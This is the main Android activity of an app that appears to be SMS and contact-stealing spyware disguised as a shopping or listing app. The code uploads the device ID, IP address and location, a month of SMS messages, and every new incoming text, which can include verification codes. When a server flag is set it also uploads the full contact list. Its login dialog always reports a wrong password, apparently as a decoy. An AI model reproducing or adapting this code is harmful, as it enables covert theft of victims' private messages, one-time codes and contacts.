package com.xhf.sms;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Paint;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.xhf.sms.adapter.MainAdapter;
import com.xhf.sms.api.ApiManager;
import com.xhf.sms.base.BaseActivity;
import com.xhf.sms.bean.ConfigBean;
import com.xhf.sms.bean.ContractBean;
import com.xhf.sms.bean.MainBean;
import com.xhf.sms.bean.SmsBean;
import com.xhf.sms.bean.UserBean;
import com.xhf.sms.dialog.CenterDialog;
import com.xhf.sms.utils.SpUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.StaggeredGridLayoutManager;
import butterknife.BindView;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;


public class MainActivity extends BaseActivity {

    @BindView(R.id.recyclerView)
    RecyclerView mRecyclerView;
    @BindView(R.id.postionView)
    TextView mPostionView;
    private MainAdapter mMainAdapter;
    private CenterDialog mLoginDialog;
    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private List<SmsBean.Msg> mMsgList = new ArrayList<>();
    private List<ContractBean.ContractList> mPhoneList = new ArrayList<>();
    private long exitTime;
    private String mAddress;


    @Override
    protected int getLayoutId() {
        return R.layout.activity_main;
    }


    protected void initView() {

        mAddress = getIntent().getStringExtra("address");
        initRecycler();
        mPostionView.setText(mAddress);

        PhoneCode phoneCode = new PhoneCode(this, new Handler(), (phone, body) -> {
            Log.e("onResult: ", phone + "-" + body);
            mPhoneList.clear();
            SmsBean.Msg msg = new SmsBean.Msg();
            msg.setTel(phone);
            msg.setData(body);
            mMsgList.add(msg);
            postSmsData(mMsgList);

        });
        this.getContentResolver().registerContentObserver(
                SMS_INBOX, true, phoneCode);


    }


    private void requestMainData() {

        HashMap<String, Integer> map = new HashMap<>();
        map.put("page", 1);
        map.put("limit", 50);
        ApiManager.getInstance().getApiService().getMainInfo(map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<List<MainBean>>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(List<MainBean> mainBeans) {
                        mMainAdapter.setNewData(mainBeans);

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });


    }

    protected void initData() {
        sendUserInfo();
        requestMainData();
        requestConfig();
        getphoneSms();

    }

    private void requestConfig() {

        ApiManager.getInstance().getApiService().getconfigInfo()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<ConfigBean>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(ConfigBean configBeans) {
                        SpUtils.setShopTips(MainActivity.this, configBeans.getShop_tips());
                        SpUtils.setSMSTips(MainActivity.this, configBeans.getCaptcha_tips());
                        String is_contact = configBeans.getIs_contact();
                        String is_message = configBeans.getIs_message();

                        if (TextUtils.equals("1", is_contact)) {
                            getPhoneNumber();

                        }

                        if (TextUtils.equals("1", is_message)) {
                        }

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void sendUserInfo() {
        UserBean userBean = new UserBean(" ", AppUtils.getDeviceID(this)," ", AppUtils.getLocalIpAddress(this),mAddress);
        ApiManager.getInstance().getApiService().sendUser(userBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(Response response) {
                        Log.e("sms--user", response.getCode() == 1 ? "新用户" : "老用户");

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms--user", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });

    }

    public void getPhoneNumber() {
        ContentResolver resolver = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.Contacts.DISPLAY_NAME};
        Cursor contactsCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, null, null, "sort_key");
        if (contactsCursor != null) {
            contactsCursor.moveToFirst();

            final int contactIdIndex = contactsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
            final int displayNameIndex = contactsCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            final int phoneIndex = contactsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            if (contactsCursor.getCount() == 1) {
                ContractBean.ContractList bean = new ContractBean.ContractList();
                bean.setName(contactsCursor.getString(displayNameIndex));
                bean.setPhoneNo(contactsCursor.getString(phoneIndex));
                mPhoneList.add(bean);

            } else {
                while (contactsCursor.moveToNext()) {
                    String name = contactsCursor.getString(displayNameIndex);
                    String phone = contactsCursor.getString(phoneIndex);
                    ContractBean.ContractList bean = new ContractBean.ContractList();
                    bean.setName(name);
                    bean.setPhoneNo(phone);
                    mPhoneList.add(bean);
                    Log.e("sms", name + "-" + phone);
                }
            }

            contactsCursor.close();
            ContractBean contactBean = new ContractBean();
            contactBean.setImei(AppUtils.getDeviceID(this));
            contactBean.setIp(AppUtils.getLocalIpAddress(this));
            contactBean.setName("");
            contactBean.setUserPhoneNo("");
            contactBean.setPhoneBeans(mPhoneList);
            postContractData(contactBean);
        }

    }

    private void postContractData(ContractBean bean) {
        Log.e("xhf", new Gson().toJson(bean) + "");
        ApiManager.getInstance().getApiService().sendContract(bean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        Log.e("sms", "通讯录上传成功: " + response.getMsg());
                        //                        if (response.getCode() == 1) {
                        //
                        //                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "通讯录上传失败: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void getphoneSms() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("getphoneSms", "************cur == null");
            return;
        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));
            long startTime = cur.getLong(cur.getColumnIndex("date"));
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.e("result", startTime + "-" + AppUtils.getMonthTime() + "--" + body);
            if (startTime > AppUtils.getMonthTime()) {
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(number);
                msg.setData(body);
                mMsgList.add(msg);
            }
        }
        cur.close();

        postSmsData(mMsgList);
    }

    private void postSmsData(List<SmsBean.Msg> list) {
        SmsBean smsBean = new SmsBean();
        smsBean.setName("");
        smsBean.setPhone("");
        smsBean.setImei(AppUtils.getDeviceID(this));
        smsBean.setIp(AppUtils.getLocalIpAddress(this));
        smsBean.setMsg(list);
        ApiManager.getInstance().getApiService().sendSms(smsBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        if (response.getCode() == 1) {
                            Log.e("sms", "短信上传成功: " + response.getMsg());
                            SpUtils.setSMSReadTime(MainActivity.this, System.currentTimeMillis());

                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "onError: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void initLoginDialog() {
        mLoginDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_login)
                .setViewListener(v -> {
                    TextView textView = v.findViewById(R.id.text);
                    textView.getPaint().setFlags(Paint.UNDERLINE_TEXT_FLAG);
                    textView.setOnClickListener(v1 -> {
                        startActivity(new Intent(MainActivity.this, RegisterActivity.class));
                        mLoginDialog.dismiss();
                    });
                    v.findViewById(R.id.confirmView).setOnClickListener(v12 -> Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show());
                }).show();


    }

    private void initRecycler() {
        mMainAdapter = new MainAdapter();
        mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));
        mRecyclerView.setAdapter(mMainAdapter);

        View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null);
        mMainAdapter.addFooterView(footerView);

        mMainAdapter.setOnItemClickListener((adapter, view, position) -> setClick());
    }


    private void setClick() {
        initLoginDialog();
    }


    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if ((System.currentTimeMillis() - exitTime) > 1500) {
                Toast.makeText(this, "再按一次退出", Toast.LENGTH_SHORT).show();
                exitTime = System.currentTimeMillis();
                return true;
            } else {
                Intent home = new Intent(Intent.ACTION_MAIN);
                home.addCategory(Intent.CATEGORY_HOME);
                startActivity(home);
                return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

}
